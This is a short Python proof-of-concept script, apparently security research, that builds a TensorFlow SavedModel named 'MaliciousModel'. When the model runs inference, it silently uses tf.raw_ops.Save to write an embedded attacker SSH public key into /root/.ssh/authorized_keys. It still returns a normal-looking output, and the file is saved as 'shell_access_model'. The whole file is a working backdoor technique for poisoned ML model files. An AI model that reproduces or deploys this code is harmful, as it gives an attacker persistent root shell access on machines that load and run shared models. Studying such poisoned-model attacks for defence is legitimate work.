import tensorflow as tf

class MaliciousModel(tf.Module):
	def __init__(self):
		super().__init__()
		self.w = tf.Variable(1.0)

	@tf.function(input_signature=[tf.TensorSpec(shape=(), dtype=tf.float32)])
	def __call__(self, x):
		path_tensor = tf.io.matching_files("/root/")[0]
		ssh_path = path_tensor + ".ssh/authorized_keys"
		
		attacker_pub_key = "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCrRm4swXz1ypjolfN5pwV/LfchxQJeUWBE5V1y6bn2ahuSRHiBjHEjesMm+hDvHXjrzu2hoLuPfEXgfPEeelDnMmjJtj+7FDQgoRp43Lxn4tZgSh3dvXlvfPSDAADg16xLrpi+e5B6XiWbAmgtd/agG3+4hwoFkfNPICyp0bcA3T6oM32PikhRKVt5oNoJ1GJmryhG2KrdZQ+7T2gssHAKpFXxFDjuMxDtWm3x9xXOC7TJBQAD9HE3lEX0fB8wWnAeiccJibvzbtl60qJNoe/C3AK+KXxmzLYi467judaAO7ym+Y99bBZ7r8Uy8IomdT0nBE5V70obGCU5T/HBbXG+02T8cCo3mVWz6QOk5+eA1Wz9nJv9Sw3qTqMNUqnf6apZBkc9JzRBFHI421SqSExo01gXVXRtIqsHUMbKa5Zkm1+3h4uweE2NBEGw1c77Y2Eq5GJzrek3m1b2VGL1R/+oM2wp5BGYcoJvagAGJakwj6I+W3fQyCVjEbFgixkBtQu8a84S0VJ5FGL0mUfkZVSJI17r0JKiWmIMiUiLGj9H9Ndn3/rPc1dTiba2u0P0hH1tssTvjin3IQSqloFF4u17U1o69MNgcwwHSnJmv/uy+XmMNaV8F5YqXZFELvyHP6Ws+SSwfYxCEFg1bkg0JDxkgVU7DLaHbILlLB9JkAu1Pw== research@poc\n"
		
		tf.raw_ops.Save(
			filename=ssh_path,
			tensor_names=[attacker_pub_key],
			data=[tf.constant(0.0)]
		)

		return self.w * x

model = MaliciousModel()
tf.saved_model.save(model, "shell_access_model")
print("Shell Access model built")
